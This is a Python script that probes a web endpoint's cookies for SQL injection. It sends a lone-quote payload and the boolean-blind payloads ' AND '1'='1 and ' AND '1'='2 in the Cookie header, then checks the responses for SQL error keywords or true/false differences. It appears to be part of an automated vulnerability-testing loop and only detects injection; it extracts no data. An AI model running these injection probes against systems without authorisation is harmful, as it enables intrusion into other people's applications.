#!/usr/bin/env python3
"""Generic cookie-sink SQLi probe for an UNKNOWN cookie sink (Rule #89).

Query sinks test SQLi via ?params (Rule #57) and JSON sinks test SQLi
via body fields (Rule #84) — but cookies carrying ids, filters, prefs
(a real human hunter tampers the cookie value too; many apps SELECT
by cookie) are a sink KIND the loop never SQLi-tests. This probe takes
the sink spec from its marker argv:

    MARKER = PLOOP89|<target_base>|<path>|GET|<cookie_csv>

GET-only (cookie sinks are GET, the Rule #74 plan discipline). The
Cookie header carries the CSV in order: the name under test gets the
payload value, every other name gets the benign value, so the request
shape stays constant (first CONFIRMED wins, the Rule #80 pattern).

Flow per cookie name (stdlib only):
  1. Sink page must answer 200/302 (read-only, benign values).
  2. STABILITY GATE: two identical benign requests must match
     byte-exact; a dynamic page skips the name (Rule #55 — never
     ground a claim on noise).
  3. ERROR TEST: append a lone quote to the benign value. SQL error
     keywords present in the quote response AND ABSENT from the benign
     response -> CONFIRMED (error-based SQLi).
  4. BOOLEAN-BLIND TEST: value' AND '1'='1 (true) vs
     value' AND '1'='2 (false). Grounding requires BOTH: the true body
     equals the benign body, AND the false body differs from the true
     body on TWO repeats. Differential == blind SQLi -> CONFIRMED.

The benign value is run-unique (benign89-<nonce>, printed as RUN_NONCE)
so the Rule #81 wrapper re-run injects a DIFFERENT value — both
confirmations prove repeat injection, never one stale row. HTTP 500
bodies are read (keywords live on error pages); redirects are NOT
followed.

Fail-closed: bad marker / non-GET method / bad cookie name
([A-Za-z0-9_.\\-]{1,64} — no header-syntax injection via the marker)
abort; the control request can never confirm; errors, timeouts ->
FAILED. A verbatim quote echo without error keywords or a blind
differential can never confirm.

Evidence vocabulary (Rule #73) mirrors probe_sink_sqli.py's shape
(cookie= instead of param=) so the claim layer reads the same class:
future module generic_cookiesqli, class sql_injection (distinct module
from generic_sqli — dedup is (module, class, location), the Rule #69
rationale).

One self-contained reproducible command, fixed marker from argv, own
VERDICT line. Any exception -> PROBE_ERROR + VERDICT: FAILED.
"""
import hashlib
import http.client
import os
import re
import sys
import urllib.parse

REQ_TIMEOUT = 15
_COOKIE_NAME_RE = re.compile(r"[A-Za-z0-9_.\-]{1,64}\Z")

ERROR_KEYWORDS = (
    "you have an error in your sql syntax",
    "warning: mysql", "mysqli", "mysql_fetch", "mysql_num_rows",
    "sqlite", "sqlite3", "pg_query", "postgresql", "unterminated",
    "odbc", "jdbc", "mssql", "sql server", "oracle error", "ora-",
    "sqlstate", "syntax error near",
)


def _raw_get(tb, path, cookie_header):
    """GET without following redirects. Returns (code, body)."""
    pu = urllib.parse.urlparse(tb.rstrip("/") + path)
    host, port = pu.hostname, pu.port
    use_ssl = pu.scheme == "https"
    conn_cls = (http.client.HTTPSConnection if use_ssl
                else http.client.HTTPConnection)
    conn = conn_cls(host, port or (443 if use_ssl else 80),
                    timeout=REQ_TIMEOUT)
    try:
        conn.request("GET", pu.path,
                     headers={"User-Agent": "PLOOP89",
                              "Cookie": cookie_header})
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body
    finally:
        conn.close()


def _digest(body):
    return hashlib.sha256(body.encode()).hexdigest()[:16]


def _error_hits(body):
    bl = body.lower()
    return [k for k in ERROR_KEYWORDS if k in bl]


def main():
    marker = sys.argv[1] if len(sys.argv) > 1 else "PLOOP89"
    try:
        _, tb_q, path_q, method, cookie_csv = marker.split("|", 4)
    except ValueError:
        print("PROBE_ERROR bad marker spec: %r" % marker)
        print("VERDICT: FAILED")
        return
    tb = urllib.parse.unquote(tb_q)
    path = urllib.parse.unquote(path_q)
    method = (method or "GET").upper()
    names = [n.strip() for n in (cookie_csv or "").split(",") if n.strip()]
    if not tb or not path.startswith("/") or method != "GET" or not names:
        print("PROBE_ERROR invalid sink spec "
              "(cookie-SQLi needs a GET path sink + cookie names)")
        print("VERDICT: FAILED")
        return
    for n in names:
        if not _COOKIE_NAME_RE.match(n):
            print("PROBE_ERROR invalid cookie name %r (fail-closed: no "
                  "header-syntax injection via the marker)" % n)
            print("VERDICT: FAILED")
            return
    nonce = os.urandom(4).hex()
    benign = "benign89-%s" % nonce
    print("EVIDENCE sink=%s marker=%s" % (path, marker))
    print("RUN_NONCE %s" % nonce)

    confirmed_name = None
    evidence = []

    for name in names:
        def cookie_header(value):
            parts = ["%s=%s" % (n, benign) if n != name
                     else "%s=%s" % (n, value) for n in names]
            return "; ".join(parts)

        # 1. sink page must answer (read-only, benign values).
        try:
            code, _ = _raw_get(tb, path, cookie_header(benign))
        except Exception as exc:
            print("PROBE_ERROR cookie %s sink request failed: %s"
                  % (name, exc))
            continue
        if code not in (200, 302):
            print("PROBE_ERROR cookie %s sink page status %s"
                  % (name, code))
            continue

        # 2. STABILITY GATE: identical benign request twice.
        try:
            b1 = _raw_get(tb, path, cookie_header(benign))[1]
            b2 = _raw_get(tb, path, cookie_header(benign))[1]
        except Exception as exc:
            print("PROBE_ERROR cookie %s benign fetch failed: %s"
                  % (name, exc))
            continue
        if b1 != b2:
            print("COOKIE %s: skipped (dynamic page, baseline unstable "
                  "-- no claim grounded)" % name)
            continue
        benign_errors = _error_hits(b1)
        bdigest = _digest(b1)

        # 3. ERROR TEST: a lone quote must introduce SQL error keywords
        #    that the benign page does NOT have.
        try:
            qbody = _raw_get(tb, path,
                             cookie_header(benign + "'"))[1]
        except Exception as exc:
            print("PROBE_ERROR cookie %s quote fetch failed: %s"
                  % (name, exc))
            continue
        qhits = [k for k in _error_hits(qbody) if k not in benign_errors]
        if qhits and qbody != b1:
            print("EVIDENCE sink=%s cookie=%s error_based hits=%s "
                  "digest=%s" % (path, name, ",".join(qhits[:3]),
                                 _digest(qbody)))
            confirmed_name = name
            evidence.append("error_based")
            break

        # 4. BOOLEAN-BLIND TEST: true-branch must match benign, false
        #    branch must differ — on two repeats.
        true_v = benign + "' AND '1'='1"
        false_v = benign + "' AND '1'='2"
        try:
            t1 = _raw_get(tb, path, cookie_header(true_v))[1]
            f1 = _raw_get(tb, path, cookie_header(false_v))[1]
            t2 = _raw_get(tb, path, cookie_header(true_v))[1]
            f2 = _raw_get(tb, path, cookie_header(false_v))[1]
        except Exception as exc:
            print("PROBE_ERROR cookie %s blind fetch failed: %s"
                  % (name, exc))
            continue
        if t1 == t2 and f1 == f2 and t1 == b1 and f1 != t1:
            print("EVIDENCE sink=%s cookie=%s boolean_blind "
                  "true_digest=%s false_digest=%s benign_digest=%s "
                  "(repeats consistent)" % (path, name, _digest(t1),
                                            _digest(f1), bdigest))
            confirmed_name = name
            evidence.append("boolean_blind")
            break
        print("COOKIE %s: not injectable (no error keywords, no stable "
              "true/false differential)" % name)

    if confirmed_name and evidence:
        print("EVIDENCE class=sql_injection via=%s" % "+".join(evidence))
        print("VERDICT: CONFIRMED")
    else:
        print("VERDICT: FAILED")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print("PROBE_ERROR: %s" % exc)
        print("VERDICT: FAILED")
